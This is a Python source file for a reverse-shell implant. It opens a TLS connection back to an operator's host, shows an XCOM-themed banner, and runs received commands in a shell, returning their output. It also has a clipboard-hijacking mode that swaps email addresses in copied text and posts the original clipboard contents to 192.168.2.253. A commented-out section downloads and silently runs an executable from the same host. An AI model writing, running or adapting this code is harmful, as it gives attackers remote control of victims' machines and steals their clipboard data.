import argparse
import os,socket,subprocess
import re;
import ssl
import sys, signal
import time
#import wget
import requests
from multiprocessing import Process
import pyperclip as pc
#https://superfastpython.com/multiprocessing-in-python/
#https://superfastpython.com/kill-all-child-processes-in-python/
#https://medium.com/fintechexplained/advanced-python-how-to-use-signal-driven-programming-in-applications-84fcb722a369
#https://www.xanthium.in/operating-system-signal-handling-in-python3
#https://www.urldecoder.io/python/
##
##Server Side Post Based on
##https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7

## To implement add python Interpreter
## https://github.com/manthey/pyexe/releases
global RHOST 
global RPORT 
global ssls
global s
global processClippy
global URL_CLIPPY
global Sentry
Sentry = True
def signal_handler(signal, frame):
    print("\nprogram exiting gracefully")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def ClippyProcess():
    time.sleep(1)
    return 0

def taskClippy():
    dataold=""
    My_url='http://192.168.2.253'
    while True:
        
        data = pc.paste()
        if(data != dataold):

                print(data)
                dataold=data
                print(re.sub("[a-z]*@[a-z]*.[a-z]*", "idiot@tok.com", data))
                pc.copy(re.sub("[a-z]*@[a-z]*.[a-z]*", "idiot@tok.com", data))
                r = requests.post(My_url, data={'Value': data})
                

        time.sleep(2)
 






# entry point
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-R", "--RHOST", type=str, required=True, action="store")
    parser.add_argument("-P", "--RPORT", type=int, required=True , action="store")
    parser.add_argument("-SH", "--SRVHOST", type=str, required=False,action="store")
    parser.add_argument("-SP", "--SRVPORT",type=int, required=False, action="store")
    parser.add_argument("-UC", "--URL_CLIPPY",type=str, required=False, action="store")
    args = parser.parse_args()
    
    RHOST= getattr(args, 'RHOST')#"192.168.2.253"
    RPORT= getattr(args, 'RPORT')#7443
    SRVHOST= "http://192.168.2.253"
    SRVPORT= 9090
    

    URL_CLIPPY="http://192.168.2.253:9090/AdvClipBoardCleverSignal.exe"
    valid_signals = signal.valid_signals()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
    ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
    ssls.connect((RHOST,RPORT))
    ssls.send(b'''Connected 
    /$$   /$$  /$$$$$$   /$$$$$$  /$$      /$$      
    | $$  / $$ /$$__  $$ /$$__  $$| $$$    /$$$      
    |  $$/ $$/| $$  \__/| $$  \ $$| $$$$  /$$$$      
    \  $$$$/ | $$      | $$  | $$| $$ $$/$$ $$      
    >$$  $$ | $$      | $$  | $$| $$  $$$| $$      
    /$$/\  $$| $$    $$| $$  | $$| $$\  $ | $$      
    | $$  \ $$|  $$$$$$/|  $$$$$$/| $$ \/  | $$      
    |__/  |__/ \______/  \______/ |__/     |__/      
                                                    
            
    byebye to quit. But the sectoids will control you mind.
    ''')    
    ssls.send(str.encode(os. getcwd()+">"))
    while True :
        data= ssls.recv(2048)
        print(str(data,"utf-8"))
        if(str(data,"utf-8")== 'byebye\n'):
            ssls.send(b'''Connected 
            XCOM will back soon   
                                                                
    $$\   $$\  $$$$$$\   $$$$$$\  $$\      $$\       
    $$ |  $$ |$$  __$$\ $$  __$$\ $$$\    $$$ |      
    \$$\ $$  |$$ /  \__|$$ /  $$ |$$$$\  $$$$ |      
    \$$$$  / $$ |      $$ |  $$ |$$\$$\$$ $$ |      
    $$  $$<  $$ |      $$ |  $$ |$$ \$$$  $$ |      
    $$  /\$$\ $$ |  $$\ $$ |  $$ |$$ |\$  /$$ |      
    $$ /  $$ |\$$$$$$  | $$$$$$  |$$ | \_/ $$ |      
    \__|  \__| \______/  \______/ \__|     \__|    

            ''')
            ssls.close()
            exit()
        if(str(data,"utf-8")== 'ClippyON\n'):
            """
            r = requests.get(URL_CLIPPY, allow_redirects=True)
            open('AdvClipBoardCleverSignal.exe', 'wb').write(r.content)
            #s = subprocess.check_output(["AdvClipBoardClever.exe", "Hello World!"])
            processClippy = subprocess.Popen("AdvClipBoardCleverSignal.exe", stdout=subprocess.PIPE, stderr=subprocess.STDOUT,universal_newlines=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
            os.kill(processClippy.pid, signal.SIGINT)
            os.k
            """
            processClippy = Process(target=taskClippy)
            processClippy.start()
            ssls.send(str.encode(os. getcwd()+">"))

        elif (str(data,"utf-8")== 'ClippyOFF\n'):
            processClippy.kill()
        elif (data[:2]== 'cd'):
            if (os.path.exists(str(data[:3]).replace('\n',''))):
                os.chdir(str(data[:3]).replace('\n',''))
                ssls.send(str.encode(os. getcwd()+">"))
        elif (data== '\n'):
                ssls.send(str.encode(os. getcwd()+">"))
        else:
            process =subprocess.Popen(str(data,"utf-8"), shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            out = process.stdout.read()+process.stderr.read()
            ssls.send(out)
            ssls.send(str.encode(os. getcwd()+">"))

    #process.stdout.read()+ process.stderr.read()




